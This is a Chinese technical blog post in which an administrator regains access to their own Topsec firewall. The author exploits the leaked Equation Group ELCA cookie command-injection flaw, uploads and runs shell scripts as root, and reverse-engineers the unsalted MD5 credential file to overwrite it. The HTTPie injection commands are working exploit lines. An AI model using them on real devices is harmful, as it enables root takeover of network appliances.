<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>天融信防火墙密码恢复手记</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">天融信防火墙密码恢复手记</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2016-10-19" class="timeago">11 月 之前</time>
          <time datetime="2016-10-19" class="fulldate">十月 19, 2016</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/experience/">经验心得</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>来源链接：<a href="http://blog.jobbole.com/106496/">伯乐在线</a></p>
<p>本文作者：<a href="http://www.jobbole.com/members/jackyspy">jackyspy</a></p>
<p>公司在用的一款防火墙，密码意外遗失，无法登陆管理平台。虽然防火墙可以正常工作，但却无法修改配置，不能根增加和删除访问列表中的IP地址，不能调整访问策略。防火墙默认仅开通https web管理界面，未开启telnet、ssh等其他管理通道。</p>
<p>联系厂家寻求技术支持，被告知必须返厂更换芯片，费用大约在2000元左右（网上搜了一下，几乎所有密码遗失的客户最终都只能选择返厂）。公司用于该网络联网的仅此一台防火墙设备，终端数量在500以上，无其他硬件备份方案。因用户众多，管理要求细致，防火墙配置非常复杂，保存的配置文件也不是最新的。若返厂维修的话，则无法找到完备的替代方案。</p>
<p>于是决定先自己想办法，开启密码恢复之旅。Go！</p>
<h2>猜测密码，自动验证</h2>
<p>首先想到的是根据可能的密码规则和常用组合，构造一个密码字典，通过编写简单的Python脚本进行登录验证。万一不行的话，就穷举来尝试暴力破解。</p>
<p>可是开始跑脚本的时候发现想法实在太天真了，存在两个致命的问题：</p>
<ol>
<li>防火墙白天负荷过重，Web响应非常慢。有时候一个请求可能在半分钟以上。</li>
<li>Web管理平台有登录次数限制，大约6次密码错误以后，就会锁定账号一段时间。</li>
</ol>
<p>在尝试了几十个最可能出现的密码组合后，彻底放弃了这条捷径。</p>
<p>看来偷懒是不成了，必须得动真格的。</p>
<h2>搜寻漏洞，获取控制权</h2>
<p>nmap扫描发现防火墙只开通了https端口。不是专业的安全研究人员，只能在网上搜索该款防火墙的漏洞资料，不(suo)幸的是，还真发现了不少。</p>
<p>找到的第一篇文章 《<a href="http://www.2cto.com/Article/201410/345138.html">看我如何在2小时内控制100+***安全设备的</a>》 提到了Heartbleed漏洞，却未对漏洞利用方式做过多解释。需要更多学习资料，根据这个方向继续搜索，又找到了一些文章：</p>
<ul>
<li><a href="http://www.tuicool.com/articles/Brm2Ebi">NSA Equation Group泄露的***产品漏洞分析（一）</a></li>
<li><a href="http://finance.ifeng.com/a/20140929/13156376_0.shtml">天融信率先发布BASH爆出高危漏洞规则库</a></li>
<li><a href="https://www.secpulse.com/archives/23760.html">***防火墙openssl漏洞可能导致信息泄漏</a></li>
<li><a href="http://www.topsec.com.cn/aqtb/aqtb1/jjtg/160820.htm">***防火墙关于“方程式组织”漏洞处置公告</a></li>
</ul>
<p>其中，NSA Equation Group那篇文章信息量最高，对漏洞的特征和产生的原因分析的非常透彻，利用方式也做了简要说明。按照文章的提示，用Brup进行Eligible Candidate漏洞测试（打算用Postman，但因chrome的https证书问题放弃），漏洞果然还在！</p>
<p>怀着激动的心情，尝试了 ls -la /&gt;/www/htdocs/1、 find / -type f&gt;/www/htdocs/1 等指令，对防火墙文件系统的目录结构进行初步了解，也看到了配置文件存放的位置。执行 cp /tos/conf/config&gt;/www/htdocs/1，把配置文件down下来一看，果然是新鲜的味道。</p>
<p>启动telnetd服务并尝试连接，报错，估计是没有加特定启动参数的缘故，没做深入研究。看来暂时还是只能通过https漏洞方式跑命令了。</p>
<p>随着执行命令次数越来越多，Brup构造请求的方式效率太低，于是写了简单的Python函数在IPython下面跑，终觉得灵活性不够。最后决定采用HTTPie命令行的方式发送https请求（curl没有httpie方便），后续所有命令都通过这种方式交互。</p>
<div class="codehilite"><pre><span></span>$ http --verify<span class="o">=</span>no https://x.x.x.x/cgi/maincgi.cgi <span class="s1">&#39;Cookie: session_id=x`ls -la /tmp&gt;/www/htdocs/1`&#39;</span>
</pre></div>


<h2>文件上传，执行脚本文件</h2>
<p>之前都是一次请求执行一条命令，效率太低，也存在诸多限制。最好的方式是上传一个sh脚本在防火墙上执行，这就需要以某种方式传送文件到防火墙上去。</p>
<p>另一方面，根据漏洞名称和Equation Group搜索到这篇文章：<a href="http://www.freebuf.com/special/112272.html">Equation Group泄露文件分析</a>，才注意到这是国际顶尖黑客组织，也是NSA合作的方程式黑客组织（Equation Group），被另一个名为“The ShadowBrokers”的黑客组织攻下了，珍藏的系列高级工具被打包分享。这可是个好东西！赶紧下载解密，找到ELCA的漏洞利用代码，运行后却发现没有如逾期般的启动nopen远程管理软件，原因未知，颇有些失望。不过在py源码中看到了文件上传的方式，其实就是利用了cgi文件上传处理方式，它每次会在/tmp目录下生成一个<code>cgi*</code>的临时文件。ELCA利用代码的流程是连续执行多次指令，第一次 <code>rm /tmp/cgi*</code>清理tmp目录，接着post上传文件同时复制保存一份<code>cp /t*/cg* /tmp/.a</code>，再加执行权限 <code>chmod +x /tmp/.a</code>，最后执行 <code>/tmp/.a</code>。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014083339613" /></p>
<p>当然，代码并没有直接上传一个可执行文件，而是巧妙（恕见识少，我知道*nix下经常这样干）的将需要的多个文件用tar打包后，附到sh脚本的最后。在sh脚本中用dd命令将tar包copy出来再解压运行。下面是工具中stage.sh的部分代码：</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014083653130" /></p>
<p>文件tar打包的Python代码片段：</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014084538492" /></p>
<div class="codehilite"><pre><span></span>http --verify<span class="o">=</span>no -b -f POST https://x.x.x.x/cgi/maincgi.cgi <span class="s1">&#39;Cookie: session_id=x`sh /t*/cg*`&#39;</span> a@test.sh<span class="p">;</span> http --verify<span class="o">=</span>no https://x.x.x.x/1
</pre></div>


<p>HTTPie可以用 uploadfilename@localfilename 的方式很方便的实现文件上传。之所以两条指令在一行是为了方便查看前一个脚本的输出。</p>
<div class="codehilite"><pre><span></span><span class="ch">#!/bin/sh</span>
<span class="c1"># 清除/tmp/cgi*，防止干扰下次运行</span>
rm -f /t*/cgi*

<span class="nb">echo</span> <span class="o">===============================</span> &gt;/www/htdocs/1
date &gt;&gt;/www/htdocs/1

<span class="nb">echo</span> <span class="s2">&quot;***************&quot;</span> &gt;&gt;/www/htdocs/1
<span class="nb">cd</span> /tmp
ps &gt;&gt;/www/htdocs/1
netstat -nltp &gt;&gt;/www/htdocs/1
ls -la /tos/etc /data/auth/db /tmp &gt;&gt;/www/htdocs/1
</pre></div>


<p>上面的示例脚本就可以一次进行多种操作，获取进程信息、网络连接情况、目录文件等多种信息，大幅减少交互次数提高效率。</p>
<h2>逆向分析，寻找密码</h2>
<p>做了很多准备工作，找到了比较便捷的脚本执行方式。而且根据ps结果来看，指令是以root权限运行的。接下来要开始干正事了，tar cf /home/htdocs/1 / 打包文件系统，down下来准备逆向分析。因为web登录入口指向maincgi.cgi，就从它开始。</p>
<p>逆向分析的过程相当繁杂、漫长、枯燥乏味，具有相当的挑战性，所以需要坚定的毅力和不时涌现的灵感。无数次调整思路和方向，无数次寻找新的突破口。</p>
<p>我现在也记不清当初分析时的前因后果，就把一些分析的结果整理下，做一个简单的分享。</p>
<p><strong>入口 maincgi.cgi</strong></p>
<p>maincgi.cgi 位于 /www/cgi/ 目录下。用IDA进行逆向分析。</p>
<p>根据登录form提交的 username 和 passwd 在string窗口搜索，x跟踪调用情况分析，最终来到 000403D4 函数内。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014084652618" /></p>
<p>下面是更容易理解的C伪代码（我开始分析的时候没找到可用的hexrays，这是事后撰写此文时找到的。:-( 工欲善其事必先利其器啊！）：</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014084737104" /></p>
<p>可以看到，username和passwd参数都原封不动的传入到login函数，想必沿着这个方向一定能找到密码保存的地方。</p>
<p>跟进发现login是import函数，不在maincgi.cgi中实现。为了方便，我把lib和so目录下所有文件的符号表都进行了分析，结果保存在一个文件中备查。</p>
<div class="codehilite"><pre><span></span>$ nm -D tos/lib/* tos/so/* &gt; symbols.txt
</pre></div>


<p>很快发现 login 函数在 /tos/so/libwebui_tools.so 中实现。</p>
<h3>入了RPC的坑</h3>
<p>本以为找到 libwebui_tools.so 中的login实现，一切皆可水落石出。谁料还是 too young, too naive。</p>
<p>根据export表很快定位到login函数的实现，开始是TLS连接127.0.0.1：4000，接着是一堆错误处理代码。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014084848183" /></p>
<p><img alt="" src="http://img.blog.csdn.net/20161014084959123" /></p>
<p>其中有一个 gui_send_reqx 函数的调用参数 CFG_AUTH 引起了我的注意，猜测是一种自定义的类RPC实现。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092000084" /></p>
<p>唉，还是C伪代码看得清楚啊！再次哭晕在厕所 :-(</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092031897" /></p>
<p>既然不是通过本地.so调用，那只有知道到底是谁提供了这个rpc服务，才能找到接下来的路。</p>
<h3>好用的netstat</h3>
<p>好在我们有执行代码的权限，好在防火墙里面有netstat命令。执行 netstat -nltp &gt;&gt;/www/htdocs/1 得到下面的结果：</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092206024" /></p>
<p>一目了然。原来服务是 tos_configd 提供的呀！被ELCA漏洞利用脚本误导了，以为是只是一个命令行shell，之前跟过，但没有细看。这不，还是要回头找它。</p>
<h3>百转千回</h3>
<p>tos_configd 分析过程并非一帆风顺。</p>
<p>根据RPC传递的参数CFG_AUTH作为线索进行追踪，看到RPC支持多个命令。当命令为CFG_AUTH时，将数字5写到参数传入的内存区域某个变量中。没有其他更多的信息，看来只能根据caller向上一步步追了。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092250603" /></p>
<p>代码回到rpc的消息处理thread中，经过逐步分析，定位到消息处理函数中。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092433183" /></p>
<p>跟进去，可以看到大致的处理流程。有一个switch过程，case 5后面就是CFG_AUTH的处理代码。5就是前面第一个过程中设置的变量。topsec_manager_auth函数用于接管用户密码鉴权工作，它是一个import函数，按照前面的方法查到它在 /tos/so/libmanager.so 中实现。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092525776" /></p>
<h3>胜利的曙光</h3>
<p>libmanager的export表非常简练，似乎每一个都让人颇感兴趣。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092610232" /></p>
<p>先看看我们的目标函数topsec_manager_auth：</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092641136" /></p>
<p>信息量很大，到这里基本上就看到了胜利的曙光。</p>
<p>首先看到的是用户名+密码的MD5，然后传入到 j_match_manager_name 函数中进行校验。这不就是经典的用户名密码校验过程嘛（未加salt）。</p>
<p>需要说明一下的是，上图中看到的username参数名称是我综合各类分析得知内容后改名的，并不是想当然，更不是IDA智能更名。username+32是密码明文，这也是在前面的分析过程中得出的结论。</p>
<p>跟进match_manager_name函数，并没有立即发现直观的密码文件读取过程。取而代之的是，内存中存在最多500个struct，其中包含了用户名和MD5值，鉴权过程就是与其一一进行匹配比对。Local_db_dev_node是一个全局buffer，搞清楚它的数据来源就找到根源了。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092726027" /></p>
<p>按X查看Local_db_dev_node的reference，还真不少。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092849919" /></p>
<p>第一个read_dev_manager_file就很像，跟进去看一下。</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014092949435" /></p>
<p>Bingo！就是它了！ /tos/etc/Tos_dev_manager_info 其实这个文件之前也注意到，不过没曾想它居然保存了鉴权信息，而且是用户名密码拼接MD5这么简单！</p>
<p>用hexdump查看之前下载的Tos_dev_manager_info进行验证，大小104字节，与分析得到的struct大小完全一致。再看用户名和密码的位置，和分析Local_db_dev_node结构完全一致。</p>
<h3>清除最后的障碍</h3>
<p>终于找到密码保存到文件了，三下五除二，自己设定一个密码，计算MD5值，修改Tos_dev_manager_info对应的区域。文件上传，覆盖，重启，等结果……</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="k">print</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="s1">&#39;superman&#39;</span> <span class="o">+</span> <span class="s1">&#39;111111&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
</pre></div>


<p>几分钟后，设备起来了，赶紧试一下密码，错误！！！</p>
<p>郁闷，怎么会呢？down下/tos/etc/Tos_dev_manager_info一看，还是老数据。看来是工作还没到位。</p>
<p>想起 libmanager 不是有那么多可疑的函数吗？挑感兴趣的进去看看，比如write_memdata2flash：</p>
<p><img alt="" src="http://img.blog.csdn.net/20161014093116889" /></p>
<p>对，就它了。一般网络设备修改配置以后，不都还来一个 wr mem 吗？估计 /data/auth/db/ 才是最终保存数据的地方，/tos/etc可能重启的时候会重新copy覆盖。</p>
<p>再重新上传一次修改好的Tos_dev_manager_info文件，只不过这次同时覆盖了几个目录下的文件。重启，用设定的密码登录，搞定！！！</p>
<h3>走过的弯路</h3>
<p>当然，我分析过的文件远不止上面这些，也不是按照本文的思路一步一步走下来，走了不少弯路。凭感觉，或为了寻找新线索，或漫无目的地毯式搜索。除了上面列举的部分之外，还分析过其他几个.so文件，跟踪过上百个函数，多数与我需要的东西关系并不太大。</p>
<p>逆向分析就是这样，不可能一帆风顺，也没有既定的方法和思路。就是要有一种执着的精神，在不断的尝试、纠错和总结过程中达到目的地。成功后那一刻豁然开朗的成就感一直是我所痴迷的。</p>
<h2>关于MD5破解不得不说的事</h2>
<p>既然知道了算法，也有了MD5数据，是不是可以真正的找回当初的密码呢？</p>
<p>和第一步猜测密码类似，用python按照一定规则，生成可能的密码序列。调用 hashlib.md5() 计算hash值与目标进行比对，结果跑了一天没结果。</p>
<p>想着这种计算密集型的程序，在python和c之间切换太频繁可能影响效率。又在网上找到一个 Fast MD5 hash implementation in x86 assembly 汇编实现的快速算法，并且根据实际需求做了一定的优化。运行，依然无结果。</p>
<p>不甘心，再到网上搜索资料，发现人家都用GPU跑字典。好吧，我也找来一个 Hashcat，在 i5 8G内存 的iMac 上试跑，的确速度非常快。然而，由于密码长，计算量过大，最终也没跑出结果，就此作罢。</p>
<p>现在想想，如果没有密码长度、规则等任何信息的话，光凭暴力破解一个非典型密码，几乎是 Mission Impossible。</p>
<h2>搞定，收工</h2>
<p>很久没写过长文，也没发过技术类文章。上一次可能要追溯到2001年8月的时候，曾以打鸡血似的饱满激情写过一篇软件逆向习作。</p>
<p>此次防火墙密码成功恢复，其漏洞功不可没。对我而言，又重温了一把当初年少时对技术的执着。</p>
<p>最后，小结一下：</p>
<ul>
<li>软件逆向分析是个体力活。</li>
<li>工欲善其事必先利其器。</li>
<li>安全问题无时无刻不在。</li>
</ul>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/71/">https://paper.seebug.org/71/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/70/"><span aria-hidden="true">&larr;</span> Spring Security OAuth RCE (...</a>
    
    
      <a class="older-posts" href="/83/">对Beescms SQL注入漏洞的进一步思考 <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
